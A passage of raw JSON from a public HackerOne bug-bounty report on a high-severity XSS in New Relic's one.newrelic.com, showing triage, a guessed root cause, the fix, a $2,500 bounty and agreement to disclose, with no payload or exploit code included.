qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=d6716bb0f24765811daa1a0cf7f916f8c4c647e44c5ec370017b6728faa2caa0","file_size":1018321,"type":"image/png"}],"allow_singular_disclosure_at":"2020-09-19T02:38:04.148Z","allow_singular_disclosure_after":-8740373.663268778,"singular_disclosure_allowed":true,"vote_count":15,"voters":["wi11","base_64","youngsheldon","mygf","rdzxytfcv","b780b984070b4485faf5765","perun","x1x0","jackxparrow","rizkylabh1","and 5 more..."],"severity":{"rating":"high","score":8.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":31873,"asset_type":"URL","asset_identifier":"one.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5182184,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"*sigh*\n\nYarp, that's definitely an XSS. \n\nI strongly suspect we're concatenating user-supplied input before passing to `dangerouslySetInnerHtml`, but will let you know more about the root cause once we find it. Thank you for reporting this!","markdown_message":"\u003cp\u003e\u003cem\u003esigh\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eYarp, that\u0026#39;s definitely an XSS. \u003c/p\u003e\n\n\u003cp\u003eI strongly suspect we\u0026#39;re concatenating user-supplied input before passing to \u003ccode\u003edangerouslySetInnerHtml\u003c/code\u003e, but will let you know more about the root cause once we find it. Thank you for reporting this!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T21:31:42.542Z","updated_at":"2019-06-24T21:31:42.542Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5182192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"████████\n\n████","markdown_message":"\u003cp\u003e████████\u003c/p\u003e\n\n\u003cp\u003e████\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T21:33:07.493Z","updated_at":"2020-08-24T14:57:08.760Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5182435,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"████████\n\nWould love to hear more about how this one slipped through the cracks when you find out more. It always amazes me when I find a NR XSS... it’s like a white whale. ","markdown_message":"\u003cp\u003e████████\u003c/p\u003e\n\n\u003cp\u003eWould love to hear more about how this one slipped through the cracks when you find out more. It always amazes me when I find a NR XSS... it’s like a white whale. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T22:27:09.434Z","updated_at":"2020-08-24T14:57:39.629Z","actor":{"username":"jon_bottarini","cleared":true,"url":"/jon_bottarini","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5232455,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @jon_bottarini, this issue should be resolved. Please let us know if you can still exploit it!\n\nIt looks like the issue was somehow caused by how we were syntax-highlighting the history. I'm following up with the team to get more details.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jon_bottarini\"\u003e@jon_bottarini\u003c/a\u003e, this issue should be resolved. Please let us know if you can still exploit it!\u003c/p\u003e\n\n\u003cp\u003eIt looks like the issue was somehow caused by how we were syntax-highlighting the history. I\u0026#39;m following up with the team to get more details.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-01T17:42:29.821Z","updated_at":"2019-07-01T17:42:29.821Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jon_bottarini","url":"/jon_bottarini"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5351600,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"██████\n\nThanks for your help keeping New Relic—and our customers—secure!","markdown_message":"\u003cp\u003e██████\u003c/p\u003e\n\n\u003cp\u003eThanks for your help keeping New Relic—and our customers—secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-17T17:14:55.738Z","updated_at":"2020-08-24T14:57:52.760Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"New Relic"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"jon_bottarini","url":"/jon_bottarini"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8984316,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-20T02:38:04.124Z","updated_at":"2020-08-20T02:38:04.124Z","first_to_agree":true,"actor":{"username":"jon_bottarini","cleared":true,"url":"/jon_bottarini","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9024549,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-24T14:58:15.405Z","updated_at":"2020-08-24T14:58:15.405Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9024550,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-24T14:58:15.551Z","updated_at":"2020-08-24T14:58:15.551Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}